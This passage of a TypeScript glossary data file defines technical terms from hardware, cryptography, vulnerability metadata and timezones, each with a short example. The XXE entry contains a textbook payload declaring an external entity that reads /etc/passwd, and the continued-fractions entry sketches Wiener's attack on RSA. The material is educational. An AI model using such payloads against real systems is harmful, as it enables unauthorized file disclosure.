    expansion: 'Linear Feedback Shift Register',
    kind: 'hardware',
    summary:
      "Shift register whose input bit is the XOR of selected tap bits. Produces long pseudorandom sequences cheaply.",
    body: [
      "An $n$-bit LFSR cycles through up to $2^n - 1$ nonzero states. Standard primitive for on-chip PRNG, scramblers, BIST pattern generators, CRC engines, and spread-spectrum codes. The all-zeros state is a fixed point and must be avoided at reset.",
      "Maximum-length sequences require a primitive tap polynomial over $\\mathrm{GF}(2)$. The 16-bit Fibonacci LFSR with taps {16, 14, 13, 11} corresponds to $x^{16} + x^{14} + x^{13} + x^{11} + 1$ and walks all 65,535 nonzero states.",
    ],
    image: {
      src: '/glossary/lfsr-fibonacci.svg',
      alt: 'Fibonacci 16-bit LFSR schematic with taps at bits 16, 14, 13, 11 feeding an XOR back into the input.',
      caption: 'Fibonacci LFSR with taps at 16, 14, 13, 11 - the maximum-length configuration for a 16-bit register. Source: [Wikipedia (CC-BY-SA)](https://en.wikipedia.org/wiki/Linear-feedback_shift_register).',
    },
    example: `// 16-bit Fibonacci LFSR, taps {16,14,13,11}, period 65535
uint16_t lfsr = 0xACE1u;
uint16_t bit  = ((lfsr >> 0) ^ (lfsr >> 2) ^ (lfsr >> 3) ^ (lfsr >> 5)) & 1u;
lfsr = (lfsr >> 1) | (bit << 15);`,
    exampleLang: 'c',
    moreHref: 'https://en.wikipedia.org/wiki/Linear-feedback_shift_register',
    moreLabel: 'Wikipedia - Linear-feedback shift register',
  },
  {
    slug: 'gold-code',
    term: 'Gold code',
    kind: 'hardware',
    summary:
      "Family of binary spreading sequences with bounded cross-correlation, built by XORing two preferred-pair m-sequences.",
    body: [
      "Introduced by Robert Gold (IEEE Trans. Information Theory, October 1967). For an $n$-stage generator the family contains $2^n + 1$ sequences of period $2^n - 1$, with pairwise cross-correlation bounded by $2^{(n+2)/2}$ - the property that enables asynchronous CDMA.",
      "GPS L1 C/A uses 1023-chip Gold codes ($n = 10$) generated by XORing two 10-bit LFSRs; each satellite is assigned a different G2 phase tap pair, giving every space vehicle a unique PRN that the receiver can correlate against in parallel.",
    ],
    example: `# GPS L1 C/A code: 1023 chips at 1.023 Mchip/s, 1 ms period
# PRN k = G1 XOR delayed(G2)
chip[i] = G1[i] ^ G2[(i + tau_k) % 1023]`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/Gold_code',
    moreLabel: 'Wikipedia - Gold code',
  },
  {
    slug: 'pwm',
    term: 'PWM',
    expansion: 'Pulse-Width Modulation',
    kind: 'hardware',
    summary:
      "Encodes an analog level as the duty cycle of a fixed-frequency rectangular wave switched faster than the load responds.",
    body: [
      "The switch is fully on or fully off, so no resistive losses; the load (motor inductance, LED persistence, buck-converter capacitor) integrates the pulse train. Duty cycle is the on-time fraction: 0% off, 100% full power.",
      "Carrier frequency is application-driven: lamp dimmers at 100–120 Hz, motor drives at kHz to tens of kHz (above the audible band), SMPS at tens to hundreds of kHz. Microcontrollers compare a free-running counter against a reference register.",
    ],
    image: {
      src: '/glossary/pwm-duty-cycles.png',
      alt: 'Three rectangular waveforms showing 25%, 50%, and 75% duty cycles, with on/off proportions labeled on each.',
      caption: 'Three duty-cycle examples on the same period - 25%, 50%, 75%. The on-time fraction is the controllable parameter. Source: [Wikimedia Commons (CC-BY-SA)](https://commons.wikimedia.org/wiki/File:Duty_Cycle_Examples.png).',
      invert: true,
    },
    example: `// Arduino: 8-bit PWM on pin 9, ~490 Hz default carrier
// duty = value / 255   - 128 = 50%
analogWrite(9, 128);`,
    exampleLang: 'c',
    moreHref: 'https://en.wikipedia.org/wiki/Pulse-width_modulation',
    moreLabel: 'Wikipedia - Pulse-width modulation',
  },
  {
    slug: 'vcd',
    term: 'VCD',
    expansion: 'Value Change Dump',
    kind: 'hardware',
    summary:
      "ASCII waveform dump format for digital simulators, standardized in IEEE Std 1364-1995 (Verilog).",
    body: [
      "Records every signal transition as a timestamped delta, so viewers (GTKWave, Surfer, vendor tools) scrub the run without re-simulating. Extended in IEEE 1364-2001.",
      "Header carries `$timescale`, then a hierarchical `$scope`/`$var` block and `$enddefinitions`. Body is `$dumpvars`, then time markers like `#100` followed by value-change tokens (`1!`, `b1010 #`). Identifier codes are short printable-ASCII handles.",
    ],
    example: `$timescale 1ns $end
$scope module top $end
$var wire 1 ! clk $end
$upscope $end
$enddefinitions $end
$dumpvars 0! $end
#5  1!
#10 0!`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/Value_change_dump',
    moreLabel: 'Wikipedia - Value change dump',
  },
  {
    slug: 'clmul',
    term: 'CLMUL',
    expansion: 'Carry-Less Multiplication (PCLMULQDQ)',
    kind: 'hardware',
    summary:
      "x86 instruction that multiplies two 64-bit polynomials over GF(2)[X] producing a 128-bit result with no carries.",
    body: [
      "Shipped with Intel Westmere in early 2010 alongside AES-NI. Treats two 64-bit XMM halves as polynomials over GF(2) and XORs partial products instead of summing with carry, writing the 128-bit result to an XMM register.",
      "The immediate byte selects which 64-bit half of each operand is used (low/low, high/low, low/high, high/high). Carry-less multiplication is the kernel of GHASH in AES-GCM and of bit-reflected CRC32/CRC64 reductions.",
    ],
    example: `; PCLMULQDQ xmm1, xmm2/m128, imm8
; Encoding: 66 0F 3A 44 /r ib   (imm8 = 0x00 -> low64 * low64)
pclmulqdq xmm1, xmm2, 0x00`,
    exampleLang: 'asm',
    moreHref: 'https://en.wikipedia.org/wiki/CLMUL_instruction_set',
    moreLabel: 'Wikipedia - CLMUL instruction set',
  },
  {
    slug: 'pal-composite',
    term: 'PAL composite video',
    expansion: 'Phase Alternating Line',
    kind: 'hardware',
    summary:
      "European 625-line, 25 fps interlaced analog TV standard with a 4.43361875 MHz colour subcarrier multiplexed into one signal.",
    body: [
      "Transmits 625 lines per frame (576 visible) at 50 interlaced fields per second. Luminance and quadrature-modulated chrominance multiplex onto one composite waveform. The V chroma phase alternates line-to-line, cancelling first-order hue errors that plagued NTSC.",
      "Each line is 64 µs: 1.65 µs front porch, 4.7 µs hsync, 5.7 µs back porch, 51.95 µs active video. The back porch carries a 2.25 µs colour burst (10 cycles at 4.43361875 MHz) as the receiver's chroma phase reference.",
    ],
    image: {
      src: '/glossary/composite-video-line.svg',
      alt: 'Labelled composite-video line waveform: sync level, blanking, back porch, active video, and white/black levels marked on the vertical axis.',
      caption: 'One composite-video line with named segments and signal levels. Source: [Wikimedia Commons - Video-line.svg, Ian Harvey (public domain)](https://commons.wikimedia.org/wiki/File:Video-line.svg).',
    },
    example: `# PAL-B/G line - 64 us total
| FP 1.65us | HSync 4.7us | BackPorch 5.7us | Active 51.95us |
                   |<-- 2.25us colour burst @ 4.43361875 MHz -->|`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/PAL',
    moreLabel: 'Wikipedia - PAL',
  },

  // ── Cryptography ────────────────────────────────────────────────
  {
    slug: 'discrete-log',
    term: 'DLP',
    expansion: 'Discrete Logarithm Problem',
    kind: 'crypto',
    summary:
      "Given a cyclic group $G$ with generator $g$ and an element $h \\in G$, find the integer $x$ such that $g^x = h$.",
    body: [
      "Raising the generator to a power is cheap (square-and-multiply runs in $O(\\log x)$ group ops), but inverting the operation - recovering $x$ from $g^x$ - has no known polynomial-time classical algorithm in well-chosen groups. That asymmetry is the basis of several public-key schemes.",
      "Underpins Diffie-Hellman, DSA, ElGamal, and their elliptic-curve analogues (ECDH, ECDSA). DLP in a finite field's multiplicative group falls to sub-exponential index-calculus; the elliptic-curve DLP has no known sub-exponential attack - why ECC needs much smaller keys for equivalent security.",
    ],
    example: `# Diffie-Hellman over a 2048-bit safe prime (RFC 3526 group 14)
# p = 2^2048 - 2^1984 - 1 + 2^64 * (floor(2^1918 * pi) + 124476)
# g = 2
#
# Alice picks secret a, sends A = g^a mod p
# Bob   picks secret b, sends B = g^b mod p
# Shared secret: K = B^a = A^b = g^(ab) mod p
#
# Eavesdropper sees (p, g, A, B) and must solve DLP to recover a or b.`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/Discrete_logarithm',
    moreLabel: 'Wikipedia - Discrete logarithm',
  },
  {
    slug: 'pell-equation',
    term: "Pell's equation",
    kind: 'crypto',
    summary:
      "The Diophantine equation $x^2 - D y^2 = 1$, where $D$ is a positive non-square integer, sought in positive integers $(x, y)$.",
    body: [
      "For any positive non-square $D$, Pell's equation has infinitely many integer solutions, all generated from a single fundamental solution $(x_1, y_1)$ via $(x_1 + y_1 \\sqrt{D})^n$. The trivial solution $(1, 0)$ always exists; the smallest non-trivial one for $D = 2$ is $(3, 2)$, since $3^2 - 2 \\cdot 2^2 = 1$.",
      "The fundamental solution comes from the continued-fraction expansion of $\\sqrt{D}$: convergents $h_i / k_i$ yield $(x, y) = (h_i, k_i)$ where the period closes. Pell-style equations appear in CFRAC factoring, knapsack/lattice cryptanalysis, and class-group cryptography.",
    ],
    example: `D = 2:   smallest non-trivial solution (x, y) = (3, 2)
         check: 3^2 - 2*2^2 = 9 - 8 = 1
D = 3:   (2, 1)            2^2 - 3*1^2 = 1
D = 5:   (9, 4)            9^2 - 5*4^2 = 81 - 80 = 1
D = 61:  (1766319049, 226153980)   - famously large for small D`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/Pell%27s_equation',
    moreLabel: "Wikipedia - Pell's equation",
  },
  {
    slug: 'continued-fractions',
    term: 'Continued fractions',
    kind: 'crypto',
    summary:
      "Representation of a real number as $x = a_0 + \\cfrac{1}{a_1 + \\cfrac{1}{a_2 + \\cdots}}$, written compactly $[a_0; a_1, a_2, \\ldots]$. Truncations (convergents) are the best rational approximations to $x$.",
    body: [
      "Every real number has a unique simple continued-fraction expansion (terminating for rationals, infinite for irrationals). For quadratic irrationals the expansion is eventually periodic - for example $\\sqrt{2} = [1; 2, 2, 2, \\ldots]$. Convergents $h_i / k_i$ satisfy $\\lvert x - h_i / k_i \\rvert < 1 / k_i^2$ and are, in a precise sense, the best rational approximations with denominator $\\leq k_i$.",
      "Wiener's RSA attack uses this: when $d < \\tfrac{1}{3} N^{1/4}$, the fraction $k/d$ appears among convergents of $e/N$, so each convergent yields a candidate $d$ in polynomial time. Continued fractions also drive Pell-equation solving and CFRAC factoring.",
    ],
    example: `sqrt(2) = [1; 2, 2, 2, 2, ...]
  convergents: 1/1, 3/2, 7/5, 17/12, 41/29, 99/70, ...
  |sqrt(2) - 99/70| < 1/70^2 = 1/4900

# Wiener attack sketch (RSA, public (N, e), small d)
expand e/N as a continued fraction
for each convergent k_i / d_i:
    phi = (e * d_i - 1) / k_i        # candidate phi(N)
    solve x^2 - (N - phi + 1)*x + N = 0
    if roots are integers -> they are p, q. Done.`,
    exampleLang: 'text',
    moreHref: 'https://en.wikipedia.org/wiki/Wiener%27s_attack',
    moreLabel: "Wikipedia - Wiener's attack",
  },
  {
    slug: 'ed448',
    term: 'Ed448',
    expansion: 'EdDSA over edwards448',
    kind: 'crypto',
    summary:
      "Edwards-curve digital signature scheme on the untwisted Edwards curve edwards448 over $\\mathbb{F}_p$ with $p = 2^{448} - 2^{224} - 1$. Targets ~224-bit security.",
    body: [
      "RFC 8032 §5.2. Curve: $x^2 + y^2 = 1 + d \\cdot x^2 y^2$ with $d = -39081$, prime $p = 2^{448} - 2^{224} - 1$ (a Solinas 'Goldilocks' prime), cofactor 4. Hash is SHAKE256; signing is deterministic, so it does not depend on a per-signature RNG.",
      "Public keys are 57 bytes (y-coordinate plus x-sign bit); signatures are 114 bytes ($R \\,\\|\\, S$). Targets ~224-bit security vs Ed25519\'s ~128, at the cost of slower per-operation performance. Approved in FIPS 186-5.",
    ],
    example: `# Python - Ed448 sign/verify with the cryptography library
from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey

sk  = Ed448PrivateKey.generate()
pk  = sk.public_key()                 # 57-byte raw encoding
msg = b"attack at dawn"

sig = sk.sign(msg)                    # 114 bytes (R || S), per RFC 8032 §5.2
pk.verify(sig, msg)                   # raises InvalidSignature on tamper`,
    exampleLang: 'python',
    moreHref: 'https://www.rfc-editor.org/rfc/rfc8032#section-5.2',
    moreLabel: 'RFC 8032 §5.2 - Ed448',
  },

  // ── Vulnerability metadata ──────────────────────────────────────
  {
    slug: 'cve',
    term: 'CVE',
    expansion: 'Common Vulnerabilities and Exposures',
    kind: 'vuln',
    summary:
      "Public catalog of disclosed security vulnerabilities. Each entry receives a unique CVE-YYYY-NNNN identifier.",
    body: [
      "Maintained by MITRE and a federation of CVE Numbering Authorities - a stable, vendor-independent handle for tracking a vulnerability across advisories, scanners, and patches.",
      "ID assignment is independent of severity - that score lives in CVSS.",
    ],
    example: `CVE-2024-3094
  │   │    │
  │   │    └── Sequence number within the year
  │   └── Year of assignment (not necessarily the bug's age)
  └── Catalog prefix`,
    exampleLang: 'text',
    moreHref: 'https://www.cve.org/',
    moreLabel: 'cve.org',
  },
  {
    slug: 'cvss',
    term: 'CVSS',
    expansion: 'Common Vulnerability Scoring System',
    kind: 'vuln',
    summary:
      "Standard 0.0–10.0 severity score for vulnerabilities, computed from a vector string of well-defined metrics. Current spec is v4.0.",
    body: [
      "Combines metrics for attack vector, complexity, attack requirements, privileges required, user interaction, and CIA impact on both the *vulnerable* system and any *subsequent* systems.",
      "Maximum base score is 9.8: network-reachable, no privileges, no user interaction, total impact across vulnerable and subsequent systems. The 10.0 ceiling additionally requires a Modified Safety metric (`MSI:S`/`MSA:S`) in the Environmental group.",
      "v4.0 (November 2023) replaces v3.1's *Scope* metric with separate Vulnerable (`VC/VI/VA`) and Subsequent (`SC/SI/SA`) impact triads, and adds Attack Requirements (`AT`) for environmental preconditions.",
    ],
    example: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
→ 9.8  Critical

  AV  Attack Vector              N  Network
  AC  Attack Complexity          L  Low
  AT  Attack Requirements        N  None
  PR  Privileges Required        N  None
  UI  User Interaction           N  None
  VC  Vulnerable Confidentiality H  High
  VI  Vulnerable Integrity       H  High
  VA  Vulnerable Availability    H  High
  SC  Subsequent Confidentiality H  High
  SI  Subsequent Integrity       H  High
  SA  Subsequent Availability    H  High`,
    exampleLang: 'text',
    moreHref: 'https://www.first.org/cvss/v4-0/',
    moreLabel: 'FIRST - CVSS v4.0 specification',
  },

  {
    slug: 'xxe',
    term: 'XXE',
    expansion: 'XML External Entity injection',
    kind: 'vuln',
    summary:
      "Attack where attacker-controlled XML references external entities the parser fetches at parse time - used for file disclosure, SSRF, denial of service, and occasionally RCE.",
    body: [
      "XML supports user-defined *entities* declared in the DOCTYPE; *external* entities point at a URL or file the parser fetches. If external-entity resolution is enabled (the default in many libraries), an attacker who controls input XML can read local files, hit internal HTTP services, or exhaust memory.",
      "Impacts: `file://` for file disclosure, `http://internal-host` for SSRF, recursive entities for billion-laughs DoS, and on poorly-configured parsers (PHP `expect://`, Java `jar:`) full RCE. Mitigation: disable DOCTYPE / external-entity resolution at parser construction.",
    ],
    example: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- The parser substitutes &xxe; with the contents of /etc/passwd -->`,
    exampleLang: 'text',
    moreHref: 'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
    moreLabel: 'OWASP - XXE Processing',
  },

  // ── Time ────────────────────────────────────────────────────────
  {
    slug: 'iana-tzdata',
    term: 'IANA tzdata',
    kind: 'time',
    summary:
      "Canonical timezone database maintained by IANA. The source every OS's UTC-offset and DST rules ultimately derive from.",
    body: [
      "Tzdata maps every named place to its UTC offset and historical DST rules. Linux, macOS, and most Unixes read it from `/usr/share/zoneinfo/`. Windows ships its own version but follows the same data.",
      "Identifies zones by `Region/City` (e.g. `Europe/Helsinki`, `Asia/Shanghai`). Released a few times per year as countries change DST policy.",
    ],
    example: `$ TZ=Europe/Helsinki  date
Sat May  3 19:42:11 EEST 2026

$ TZ=Asia/Shanghai    date
Sun May  4 00:42:11 CST 2026

$ ls /usr/share/zoneinfo/Europe/ | head
Amsterdam   Athens     Berlin     Helsinki   London     Paris`,
    exampleLang: 'bash',
    moreHref: 'https://www.iana.org/time-zones',
    moreLabel: 'IANA - Time Zone Database',
  },
];

const BY_SLUG = new Map(GLOSSARY.map((e) => [e.slug, e]));
export function getEntry(slug: string): Entry | undefined {
  return BY_SLUG.get(slug);
}
